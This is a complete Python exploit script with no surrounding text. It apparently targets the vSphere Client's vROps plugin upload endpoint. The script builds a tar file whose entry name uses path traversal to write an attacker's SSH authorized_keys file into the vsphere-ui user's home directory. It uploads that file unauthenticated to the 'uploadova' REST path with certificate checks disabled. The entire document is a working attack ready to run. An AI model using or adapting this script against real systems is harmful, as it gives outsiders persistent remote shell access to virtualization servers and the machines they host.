import tarfile
import os
import io
import requests
import urllib3
from tempfile import TemporaryFile
import argparse

def exp(url, authorized_keys_file):
    urllib3.disable_warnings()
    payload = TemporaryFile(delete=False)
    with tarfile.open(payload.name, mode='w') as tar:
        file_data = io.FileIO(authorized_keys_file).readall()
        data = io.BytesIO(file_data)
        info = tarfile.TarInfo(name='../../home/vsphere-ui/.ssh/authorized_keys')
        info.size = len(file_data)
        tar.addfile(info, data)
    files = {
        'uploadFile': open(payload.name)
    }
    resp = requests.post(url + "/ui/vropspluginui/rest/services/uploadova", files=files, verify=False)
    print(resp.text)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="url", required=True, help="https://127.0.0.1")
    parser.add_argument("-f", dest="file", help="authorized_keys file", required=True)
    args = parser.parse_args()
    exp(args.url, args.file)
